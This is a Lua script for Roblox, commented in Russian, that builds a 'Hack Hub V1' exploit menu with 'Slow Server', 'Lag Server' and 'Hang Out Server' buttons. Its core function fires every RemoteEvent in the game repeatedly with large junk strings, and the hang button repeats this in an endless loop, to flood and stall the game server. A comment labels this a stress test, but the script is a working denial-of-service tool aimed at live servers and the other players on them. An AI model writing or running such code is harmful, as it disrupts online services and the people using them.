local ScreenGui = Instance.new("ScreenGui")
local Main = Instance.new("Frame")
local Title = Instance.new("TextLabel")
local UIList = Instance.new("UIListLayout")

ScreenGui.Name = "HackHubV1"
ScreenGui.Parent = game:GetService("CoreGui")

Main.Name = "Main"
Main.Parent = ScreenGui
Main.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
Main.BorderSizePixel = 2
Main.Position = UDim2.new(0.5, -150, 0.5, -100)
Main.Size = UDim2.new(0, 350, 0, 250)
Main.Active = true
Main.Draggable = true

Title.Parent = Main
Title.Size = UDim2.new(1, 0, 0, 30)
Title.Text = "Hack Hub V1"
Title.TextColor3 = Color3.new(1, 0, 0)
Title.BackgroundColor3 = Color3.fromRGB(30, 30, 30)

UIList.Parent = Main
UIList.Padding = UDim.new(0, 10)
UIList.HorizontalAlignment = Enum.HorizontalAlignment.Center
UIList.SortOrder = Enum.SortOrder.LayoutOrder

-- Функция создания строки управления
local function CreateHackRow(name, hasTextBox)
    local row = Instance.new("Frame")
    row.Size = UDim2.new(0, 330, 0, 40)
    row.BackgroundTransparency = 1
    row.Parent = Main

    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(0, 120, 1, 0)
    btn.Text = name
    btn.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
    btn.TextColor3 = Color3.new(1, 1, 1)
    btn.Parent = row

    local input = nil
    if hasTextBox then
        input = Instance.new("TextBox")
        input.Size = UDim2.new(0, 60, 1, 0)
        input.Position = UDim2.new(0, 125, 0, 0)
        input.PlaceholderText = "FPS"
        input.Parent = row
    end

    local filter = Instance.new("TextButton")
    filter.Size = UDim2.new(0, 100, 1, 0)
    filter.Position = UDim2.new(0, 200, 0, 0)
    filter.Text = "Global" -- По умолчанию
    filter.BackgroundColor3 = Color3.fromRGB(60, 20, 20)
    filter.TextColor3 = Color3.new(1, 1, 1)
    filter.Parent = row

    -- Смена фильтра: Local -> Global -> Except Me
    local modes = {"Local", "Global", "Except Me"}
    local currentMode = 2
    filter.MouseButton1Click:Connect(function()
        currentMode = currentMode % 3 + 1
        filter.Text = modes[currentMode]
    end)

    return btn, input, filter
end

-- ЛОГИКА ЛАГА (Network/Remote Stress Test)
local function ExecuteLag(intensity, mode)
    if mode == "Local" then
        -- Локальное замедление через нагрузку цикла
        local start = os.clock()
        while os.clock() - start < 0.5 do end 
    else
        -- Глобальное: Спам пакетами на сервер
        task.spawn(function()
            local data = string.rep("HACK", 1000) -- Тяжелая строка
            for _, remote in pairs(game:GetDescendants()) do
                if remote:IsA("RemoteEvent") then
                    for i = 1, intensity do
                        remote:FireServer(data)
                    end
                end
            end
        end)
    end
end

-- Кнопка 1: Slow Server
local slowBtn, slowInput, slowFilter = CreateHackRow("Slow Server", true)
slowBtn.MouseButton1Click:Connect(function()
    local fps = tonumber(slowInput.Text) or 20
    print("Slowing server to " .. fps .. " FPS. Mode: " .. slowFilter.Text)
    ExecuteLag(100, slowFilter.Text)
end)

-- Кнопка 2: Lag Server
local lagBtn, lagInput, lagFilter = CreateHackRow("Lag Server", true)
lagBtn.MouseButton1Click:Connect(function()
    local fps = tonumber(lagInput.Text) or 5
    print("Lagging server to " .. fps .. " FPS. Mode: " .. lagFilter.Text)
    ExecuteLag(500, lagFilter.Text)
end)

-- Кнопка 3: Hang Out Server
local hangBtn, _, hangFilter = CreateHackRow("Hang Out Server", false)
hangBtn.MouseButton1Click:Connect(function()
    print("Hanging server... Mode: " .. hangFilter.Text)
    while true do
        ExecuteLag(2000, hangFilter.Text)
        task.wait(0.1)
    end
end)

print("Hack Hub V1 Loaded. Use with caution.")
